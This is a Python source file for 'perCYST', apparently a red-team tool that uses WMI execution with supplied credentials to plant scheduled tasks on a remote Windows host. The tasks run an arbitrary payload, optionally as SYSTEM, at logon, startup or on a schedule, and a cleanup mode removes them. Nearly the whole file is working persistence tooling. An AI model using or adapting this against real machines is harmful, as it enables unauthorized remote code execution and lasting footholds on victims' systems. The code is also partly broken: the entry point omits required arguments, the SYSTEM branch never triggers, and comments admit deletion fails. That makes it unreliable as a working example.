import wmiexec
import getpass

# Author: Kirk Hayes (@l0gan)

class SchedTask:

    def __init__(self, ip, username, passwd, share):
        self.ip = ip
        self.username = username
        self.passwd = passwd
        self.share = share

    def main(self):
        while True:
            c = raw_input("[!] Set or Cleanup?: ")
            if c.lower() == "set":
                self.setPercyst()
                break
            elif str(c.lower()) == "cleanup":
                self.cleanup()
                break
            else:
                print("[-] Invalid Choice")

    def setPercyst(self):
        # Setup Variables to Insert Sceduled Tasks
        taskName = raw_input("[!] Enter Task Name (Appears in Task Scheduler): ")
        payload = raw_input("[!] Enter payload to run (Can be a command or a file to run): ")
        schedule = raw_input("[!] Enter when to run (Options: MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT): ")
        user = raw_input("[!] Run as SYSTEM? (Must have Administrator Privileges to run) (Y/N): ")
        runas = ""
        if user.lower() == "y":
            user = "SYSTEM"
            runas = " /ru " + user
        time = raw_input("[!] What time should the task run?: ")
        # Running as SYSTEM isnt working. Need to troubleshoot.
        if runas == "SYSTEM":
            cmd = "schtasks /create /tn \"" + taskName + "\" /tr \"" + payload + "\" /sc " + schedule + " " + runas + " /st " + time
        else:
            cmd = "schtasks /create /tn \"" + taskName + "\" /tr \"" + payload + "\" /sc " + schedule + " /st " + time
        f = open("SchedTask.csv", "a")
        f.write(cmd + "\n")
        f.close()
        print(cmd)
        self.runCmd(cmd)
        print("[+] Scheduled Task Set")

    def runCmd(self, cmd):
        print("[+] Cyst attaching to host")
        execute1 = wmiexec.WMIEXEC(command=cmd, username=self.username, password=self.passwd, share=self.share)#, noOutput=True)
        execute1.run(self.ip)

    def cleanup(self):
        # Read from file into list to see which task to delete.
        # May want to change this up to pull in all the information for that task to keep from needing to type it in.
        tasks = []
        print("[-] Tasks set by perCYST:")
        num = 1
        f = open("SchedTask.csv", "r")
        for line in f:
            task = line.split('"')[1]
            print(str(num) + ": " + task)
            tasks.append(task)
            num = num + 1
        f.close()
        choice = raw_input("[!] Which task would you like to cleanup? (Enter the number): ")
        choice = int(choice) - 1
        taskName = tasks[choice]
        #schtasks /delete /tn {TaskName}
        # deletion is failing? not sure why yet
        cmd = "schtasks /delete /tn " + taskName
        self.runCmd(cmd)
        print("[+] Cleanup Complete")


    def ascii(self):
        print('perCYST\n\n<INSERT ASCII ART HERE>\n\n')

if __name__ == '__main__':
    SchedTask().ascii()
    SchedTask().main()
